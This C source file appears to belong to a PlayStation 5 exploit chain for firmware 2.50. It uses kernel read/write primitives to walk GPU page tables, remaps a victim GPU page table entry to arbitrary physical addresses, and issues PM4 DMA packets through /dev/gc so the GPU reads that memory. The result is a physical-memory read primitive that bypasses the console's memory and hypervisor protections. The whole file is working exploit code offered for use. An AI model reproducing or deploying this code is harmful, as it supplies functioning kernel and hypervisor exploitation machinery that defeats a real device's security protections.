#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include <ps5/kernel.h>

#include "gpu_dma_0250.h"
#include "hv_0250.h"
#include "util_0250.h"

int sceKernelAllocateMainDirectMemory(size_t size, size_t alignment,
                                      int mem_type, uint64_t *phys_out);
int sceKernelMapNamedDirectMemory(void **va_out, size_t size, int prot,
                                  int flags, uint64_t phys, size_t alignment,
                                  const char *name);

static struct gpu_0250_ctx s_gpu = {.fd = -1};
static struct gpu_0250_offsets s_gpu_offsets = {0};
static int s_offsets_set = 0;

struct gpu_0250_ctx *gpu_0250_get_ctx(void) { return &s_gpu; }

void gpu_0250_set_offsets(const struct gpu_0250_offsets *offsets) {
  memcpy(&s_gpu_offsets, offsets, sizeof(s_gpu_offsets));
  s_offsets_set = 1;
}

static uint64_t gpu_pde_field(uint64_t pde, int shift, uint64_t mask) {
  return (pde >> shift) & mask;
}

static int gpu_get_vmid(void) {
  uint64_t curproc = kernel_get_proc(getpid());
  uint64_t vmspace = 0;
  uint32_t vmid = 0;

  if (!INKERNEL(curproc))
    return -1;
  if (kernel_copyout(curproc + s_gpu_offsets.proc_vmspace, &vmspace,
                     sizeof(vmspace)))
    return -1;
  if (!INKERNEL(vmspace))
    return -1;
  if (kernel_copyout(vmspace + s_gpu_offsets.vmspace_vm_vmid, &vmid,
                     sizeof(vmid)))
    return -1;
  return vmid < 0x1000 ? (int)vmid : -1;
}

static uint64_t gpu_get_pdb2_addr(int vmid) {
  // gvmspace_base = KERNEL_ADDRESS_DATA_BASE + data_base_gvmspace
  // gvmspace[vmid] = gvmspace_base + vmid * sizeof_gvmspace
  // pdb2 = gvmspace[vmid]->page_dir_va

  if (vmid < 0)
    return 0;
  uint64_t gvmspace = KERNEL_ADDRESS_DATA_BASE +
                      s_gpu_offsets.data_base_gvmspace +
                      (uint64_t)vmid * s_gpu_offsets.sizeof_gvmspace;
  if (!INKERNEL(gvmspace))
    return 0;

  uint64_t pdb2_va = 0;
  if (kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_page_dir_va, &pdb2_va,
                     sizeof(pdb2_va)))
    return 0;
  return INKERNEL(pdb2_va) ? pdb2_va : 0;
}

static uint64_t gpu_get_relative_va(int vmid, uint64_t va) {
  uint64_t gvmspace = KERNEL_ADDRESS_DATA_BASE +
                      s_gpu_offsets.data_base_gvmspace +
                      (uint64_t)vmid * s_gpu_offsets.sizeof_gvmspace;
  if (vmid < 0 || !INKERNEL(gvmspace))
    return (uint64_t)-1;

  uint64_t start_va = 0, size = 0;
  if (kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_start_va, &start_va,
                     sizeof(start_va)) ||
      kernel_copyout(gvmspace + s_gpu_offsets.gvmspace_size, &size,
                     sizeof(size)))
    return (uint64_t)-1;

  if (size && va >= start_va && va - start_va < size)
    return va - start_va;

  return (uint64_t)-1;
}

static uint64_t gpu_walk_pt(int vmid, uint64_t gpu_va,
                            uint64_t *out_page_size) {
  uint64_t pdb2_addr = gpu_get_pdb2_addr(vmid);
  if (!pdb2_addr)
    return 0;

  uint64_t pml4e_idx = (gpu_va >> 39) & 0x1FF;
  uint64_t pdpe_idx = (gpu_va >> 30) & 0x1FF;
  uint64_t pde_idx = (gpu_va >> 21) & 0x1FF;

  // PDB2 (PML4 equivalent)
  uint64_t pml4e = 0;
  if (kernel_copyout(pdb2_addr + pml4e_idx * 8, &pml4e, sizeof(pml4e)))
    return 0;

  if (gpu_pde_field(pml4e, GPU_PDE_VALID_BIT, 1) != 1)
    return 0;

  // PDB1 (PDPT equivalent)
  uint64_t pdp_pa = pml4e & GPU_PDE_ADDR_MASK;
  if (!pdp_pa || pdp_pa >= GPU_PHYS_ADDR_LIMIT)
    return 0;
  uint64_t pdpe_va = dmap + pdp_pa + pdpe_idx * 8;
  uint64_t pdpe = 0;
  if (kernel_copyout(pdpe_va, &pdpe, sizeof(pdpe)))
    return 0;

  if (gpu_pde_field(pdpe, GPU_PDE_VALID_BIT, 1) != 1)
    return 0;

  // PDB0 (PD equivalent)
  uint64_t pd_pa = pdpe & GPU_PDE_ADDR_MASK;
  if (!pd_pa || pd_pa >= GPU_PHYS_ADDR_LIMIT)
    return 0;
  uint64_t pde_va = dmap + pd_pa + pde_idx * 8;
  uint64_t pde = 0;
  if (kernel_copyout(pde_va, &pde, sizeof(pde)))
    return 0;

  if (gpu_pde_field(pde, GPU_PDE_VALID_BIT, 1) != 1)
    return 0;

  if (gpu_pde_field(pde, GPU_PDE_IS_PTE_BIT, 1) != 1)
    return 0;
  *out_page_size = 0x200000;
  return pde_va;
}

static uint64_t gpu_alloc_dmem(uint64_t size, int gpu_write) {
  uint64_t phys = 0;
  void *va_out = NULL;

  int prot = PROT_READ | PROT_WRITE | PROT_GPU_READ;
  if (gpu_write)
    prot |= PROT_GPU_WRITE;

  int ret = sceKernelAllocateMainDirectMemory(size, size, 1, &phys);
  if (ret != 0) {
    printf("[gpu] sceKernelAllocateMainDirectMemory failed: 0x%x\n", ret);
    return 0;
  }

  ret = sceKernelMapNamedDirectMemory(&va_out, size, prot, MAP_NO_COALESCE,
                                      phys, size, "gpudma");
  if (ret != 0) {
    printf("[gpu] sceKernelMapNamedDirectMemory failed: 0x%x\n", ret);
    return 0;
  }

  return (uint64_t)va_out;
}

static uint32_t pm4_type3_header(uint32_t opcode, uint32_t count) {
  return ((PM4_TYPE3 & 0x3) << 30) | (((count - 1) & 0x3FFF) << 16) |
         ((opcode & 0xFF) << 8) | ((PM4_SHADER_COMPUTE & 0x1) << 1);
}

static int pm4_build_dma_data(void *buf, uint64_t dst_va, uint64_t src_va,
                              uint32_t length) {
  uint32_t *pkt = (uint32_t *)buf;
  uint32_t count = 6;

  uint32_t dma_hdr = (1u << 31)    // cp_sync
                     | (2u << 25)  // dst_cache_policy
                     | (1u << 27)  // dst_volatile
                     | (2u << 13)  // src_cache_policy
                     | (1u << 15); // src_volatile

  pkt[0] = pm4_type3_header(PM4_OPCODE_DMA_DATA, count);
  pkt[1] = dma_hdr;
  pkt[2] = (uint32_t)(src_va & 0xFFFFFFFF);
  pkt[3] = (uint32_t)(src_va >> 32);
  pkt[4] = (uint32_t)(dst_va & 0xFFFFFFFF);
  pkt[5] = (uint32_t)(dst_va >> 32);
  pkt[6] = length & 0x1FFFFF;

  return 7 * sizeof(uint32_t);
}

static void gpu_build_cmd_descriptor(void *desc, uint64_t gpu_addr,
                                     uint32_t size_bytes) {
  uint64_t *d = (uint64_t *)desc;
  uint32_t size_dwords = size_bytes >> 2;

  d[0] = ((gpu_addr & 0xFFFFFFFFULL) << 32) | 0xC0023F00ULL;
  d[1] =
      (((uint64_t)size_dwords & 0xFFFFF) << 32) | ((gpu_addr >> 32) & 0xFFFF);
}

static int gpu_submit_commands(int fd, uint32_t pipe_id, uint32_t cmd_count,
                               uint64_t descriptors_ptr) {
  struct {
    uint32_t pipe_id;
    uint32_t count;
    uint64_t cmd_buf_ptr;
  } submit;

  submit.pipe_id = pipe_id;
  submit.count = cmd_count;
  submit.cmd_buf_ptr = descriptors_ptr;

  return ioctl(fd, GPU_SUBMIT_IOCTL, &submit);
}

static int gpu_restore_victim_pte(void) {
  uint64_t original = s_gpu.cleared_ptbe | s_gpu.victim_real_pa;
  kernel_setlong(s_gpu.victim_ptbe_va, original);
  if (kernel_getlong(s_gpu.victim_ptbe_va) != original) {
    printf("[gpu] victim PTE restore verification failed\n");
    return -1;
  }
  return 0;
}

static int gpu_restore_victim_mapping(void) {
  int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
  int prot_rw = prot_ro | PROT_GPU_WRITE;
  int failed = 0;

  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro)) {
    printf("[gpu] victim restore: read-only mprotect failed\n");
    failed = 1;
  }
  if (gpu_restore_victim_pte())
    failed = 1;
  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw)) {
    printf("[gpu] victim restore: read-write mprotect failed\n");
    failed = 1;
  }

  uint64_t final = kernel_getlong(s_gpu.victim_ptbe_va);
  if ((final & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa ||
      (final & ~s_gpu.leaf_pa_mask) !=
          (s_gpu.original_rw_ptbe & ~s_gpu.leaf_pa_mask)) {
    printf("[gpu] victim restore: final PTE mismatch "
           "got=0x%lx expected=0x%lx\n",
           final, s_gpu.original_rw_ptbe);
    failed = 1;
  }
  return failed ? -1 : 0;
}

static int gpu_transfer_physical(uint64_t phys_addr, void *local_buf,
                                 uint32_t size) {
  if (!s_gpu.initialized || !local_buf || !size || size > 0x1FFFFF ||
      phys_addr >= GPU_PHYS_ADDR_LIMIT ||
      size > GPU_PHYS_ADDR_LIMIT - phys_addr)
    return -1;

  uint64_t aligned_pa = phys_addr & ~(s_gpu.dmem_size - 1);
  uint64_t offset = phys_addr - aligned_pa;

  if (offset + size > s_gpu.dmem_size) {
    printf("[gpu] transfer exceeds dmem_size\n");
    return -1;
  }
  if (!s_gpu.leaf_pa_mask || (aligned_pa & ~s_gpu.leaf_pa_mask))
    return -1;

  int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
  int prot_rw = prot_ro | PROT_GPU_WRITE;

  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro)) {
    printf("[gpu] failed to make victim mapping read-only\n");
    return -1;
  }

  uint64_t new_ptbe = s_gpu.cleared_ptbe | aligned_pa;
  kernel_setlong(s_gpu.victim_ptbe_va, new_ptbe);
  if (kernel_getlong(s_gpu.victim_ptbe_va) != new_ptbe) {
    printf("[gpu] victim PTE remap verification failed\n");
    gpu_restore_victim_mapping();
    return -1;
  }

  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw)) {
    printf("[gpu] failed to restore victim GPU write access\n");
    gpu_restore_victim_mapping();
    return -1;
  }
  uint64_t active_ptbe = kernel_getlong(s_gpu.victim_ptbe_va);
  if ((active_ptbe & s_gpu.leaf_pa_mask) != aligned_pa) {
    printf("[gpu] victim PTE changed PA during permission flush "
           "got=0x%lx expected=0x%lx\n",
           active_ptbe & s_gpu.leaf_pa_mask, aligned_pa);
    gpu_restore_victim_mapping();
    return -1;
  }
  uint64_t src = s_gpu.victim_va + offset;
  uint64_t dst = s_gpu.transfer_va;

  int cmd_size = pm4_build_dma_data((void *)s_gpu.cmd_va, dst, src, size);

  static uint64_t sequence;
  uint64_t completion = 0x475055444D410000ULL ^ ++sequence;
  volatile uint64_t *completion_dst =
      (volatile uint64_t *)(s_gpu.cmd_va + 0x2000);
  uint64_t *completion_src = (uint64_t *)(s_gpu.cmd_va + 0x3000);
  *completion_dst = ~completion;
  *completion_src = completion;
  cmd_size += pm4_build_dma_data((void *)(s_gpu.cmd_va + cmd_size),
                                 s_gpu.cmd_va + 0x2000, s_gpu.cmd_va + 0x3000,
                                 sizeof(completion));
  __sync_synchronize();

  uint8_t desc[16];
  gpu_build_cmd_descriptor(desc, s_gpu.cmd_va, cmd_size);

  uint64_t desc_va = s_gpu.cmd_va + 0x1000;
  memcpy((void *)desc_va, desc, 16);

  int ret = gpu_submit_commands(s_gpu.fd, 0, 1, desc_va);
  if (ret != 0) {
    printf("[gpu] ioctl submit failed: %d\n", ret);
    gpu_restore_victim_mapping();
    return -1;
  }

  int completed = 0;
  for (uint32_t wait = 0; wait < 10000; wait++) {
    __sync_synchronize();
    if (*completion_dst == completion) {
      completed = 1;
      break;
    }
    usleep(10);
  }
  if (!completed) {
    printf("[gpu] DMA completion marker timed out\n");
    gpu_restore_victim_mapping();
    return -1;
  }

  memcpy(local_buf, (void *)s_gpu.transfer_va, size);

  if (gpu_restore_victim_mapping())
    return -1;

  return 0;
}

int gpu_0250_init(void) {
  if (s_gpu.initialized) {
    return 0;
  }

  if (!s_offsets_set) {
    printf("[gpu] offsets were not configured\n");
    return -1;
  }

  s_gpu.dmem_size = 0x200000;
  s_gpu.fd = open("/dev/gc", O_RDWR);
  if (s_gpu.fd < 0) {
    printf("[gpu] ERROR: failed to open /dev/gc (fd=%d)\n", s_gpu.fd);
    return -1;
  }
  s_gpu.victim_va = gpu_alloc_dmem(s_gpu.dmem_size, 1);
  if (!s_gpu.victim_va) {
    printf("[gpu] victim alloc failed\n");
    return -2;
  }

  s_gpu.transfer_va = gpu_alloc_dmem(s_gpu.dmem_size, 1);
  if (!s_gpu.transfer_va) {
    printf("[gpu] transfer alloc failed\n");
    return -2;
  }

  s_gpu.cmd_va = gpu_alloc_dmem(s_gpu.dmem_size, 1);
  if (!s_gpu.cmd_va) {
    printf("[gpu] cmd alloc failed\n");
    return -2;
  }

  // The allocator returns a mapping offset. Translate the mapped VAs to the
  // hardware PAs consumed by the GPU and IOMMU, then cross-check the GPU PTE.
  s_gpu.victim_real_pa = pmap_kextract_0250(s_gpu.victim_va);
  s_gpu.transfer_real_pa = pmap_kextract_0250(s_gpu.transfer_va);
  if (!s_gpu.victim_real_pa || (s_gpu.victim_real_pa & (s_gpu.dmem_size - 1)) ||
      s_gpu.victim_real_pa >= GPU_PHYS_ADDR_LIMIT || !s_gpu.transfer_real_pa ||
      (s_gpu.transfer_real_pa & (s_gpu.dmem_size - 1)) ||
      s_gpu.transfer_real_pa >= GPU_PHYS_ADDR_LIMIT) {
    printf("[gpu] ERROR: direct-memory physical address is invalid "
           "victim=0x%lx transfer=0x%lx\n",
           s_gpu.victim_real_pa, s_gpu.transfer_real_pa);
    return -3;
  }
  uint64_t transfer_end_pa =
      pmap_kextract_0250(s_gpu.transfer_va + s_gpu.dmem_size - 0x4000);
  if (transfer_end_pa != s_gpu.transfer_real_pa + s_gpu.dmem_size - 0x4000) {
    printf("[gpu] ERROR: transfer mapping is not physically contiguous "
           "end=0x%lx expected=0x%lx\n",
           transfer_end_pa, s_gpu.transfer_real_pa + s_gpu.dmem_size - 0x4000);
    return -3;
  }

  int vmid = gpu_get_vmid();
  if (vmid < 0) {
    printf("[gpu] ERROR: invalid GPU VMID\n");
    return -3;
  }

  if (s_gpu_offsets.data_base_gvmspace == 0) {
    printf("[gpu] ERROR: data_base_gvmspace not set\n");
    return -3;
  }

  uint64_t rel_va = gpu_get_relative_va(vmid, s_gpu.victim_va);
  if (rel_va == (uint64_t)-1) {
    printf("[gpu] ERROR: could not get relative VA for victim\n");
    return -3;
  }
  s_gpu.victim_ptbe_va = gpu_walk_pt(vmid, rel_va, &s_gpu.page_size);
  if (s_gpu.victim_ptbe_va == 0) {
    printf("[gpu] ERROR: GPU page table walk failed\n");
    return -4;
  }
  if (s_gpu.page_size != s_gpu.dmem_size) {
    printf("[gpu] ERROR: page size 0x%lx != dmem_size 0x%lx\n", s_gpu.page_size,
           s_gpu.dmem_size);
    return -4;
  }

  int prot_ro = PROT_READ | PROT_WRITE | PROT_GPU_READ;
  int prot_rw = prot_ro | PROT_GPU_WRITE;
  uint64_t initial_rw_ptbe = 0;
  if (kernel_copyout(s_gpu.victim_ptbe_va, &initial_rw_ptbe,
                     sizeof(initial_rw_ptbe))) {
    printf("[gpu] ERROR: initial victim PTE read failed\n");
    return -4;
  }
  s_gpu.leaf_pa_mask = GPU_PDE_ADDR_MASK & ~(s_gpu.page_size - 1);
  if ((initial_rw_ptbe & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa) {
    printf("[gpu] ERROR: initial victim PTE physical address mismatch "
           "translated=0x%lx pte=0x%lx\n",
           s_gpu.victim_real_pa, initial_rw_ptbe & s_gpu.leaf_pa_mask);
    return -4;
  }
  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_ro)) {
    printf("[gpu] ERROR: failed to flush victim mapping read-only\n");
    return -4;
  }

  uint64_t current_ptbe = 0;
  if (kernel_copyout(s_gpu.victim_ptbe_va, &current_ptbe,
                     sizeof(current_ptbe))) {
    printf("[gpu] ERROR: victim PTE read failed\n");
    mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw);
    return -4;
  }
  uint64_t current_pte_pa = current_ptbe & s_gpu.leaf_pa_mask;
  if (current_pte_pa != s_gpu.victim_real_pa) {
    printf("[gpu] ERROR: victim PTE physical address mismatch "
           "translated=0x%lx pte=0x%lx\n",
           s_gpu.victim_real_pa, current_pte_pa);
    mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw);
    return -4;
  }
  s_gpu.cleared_ptbe = current_ptbe & ~s_gpu.leaf_pa_mask;

  if (mprotect((void *)s_gpu.victim_va, s_gpu.dmem_size, prot_rw)) {
    printf("[gpu] ERROR: failed to restore victim GPU write access\n");
    return -4;
  }
  s_gpu.original_rw_ptbe = kernel_getlong(s_gpu.victim_ptbe_va);
  if ((s_gpu.original_rw_ptbe & s_gpu.leaf_pa_mask) != s_gpu.victim_real_pa) {
    printf("[gpu] ERROR: writable victim PTE physical address mismatch "
           "pte=0x%lx\n",
           s_gpu.original_rw_ptbe);
    return -4;
  }
  s_gpu.initialized = 1;
  uint64_t *victim_word = (uint64_t *)s_gpu.victim_va;
  uint64_t saved_word = *victim_word;
  uint64_t test_pattern = 0x475055524553544FULL;
  uint64_t test_readback = 0;
  *victim_word = test_pattern;
  __sync_synchronize();
  int test_result = gpu_0250_read_phys(s_gpu.victim_real_pa, &test_readback,
                                       sizeof(test_readback));
  *victim_word = saved_word;
  __sync_synchronize();
  if (test_result || test_readback != test_pattern) {
    printf("[gpu] ERROR: remap/restore self-test failed "
           "result=%d read=0x%lx expected=0x%lx\n",
           test_result, test_readback, test_pattern);
    return -4;
  }
  return 0;
}

int gpu_0250_read_phys(uint64_t phys_addr, void *out_buf, uint32_t size) {
  return gpu_transfer_physical(phys_addr, out_buf, size);
}

int gpu_0250_cleanup(void) {
  int failed = 0;
  if (s_gpu.initialized) {
    if (gpu_restore_victim_mapping()) {
      printf("[gpu] ERROR: final victim mapping restore failed\n");
      failed = 1;
    }
  }

  if (s_gpu.fd >= 0) {
    if (close(s_gpu.fd))
      failed = 1;
    s_gpu.fd = -1;
  }

  s_gpu.initialized = 0;
  return failed ? -1 : 0;
}
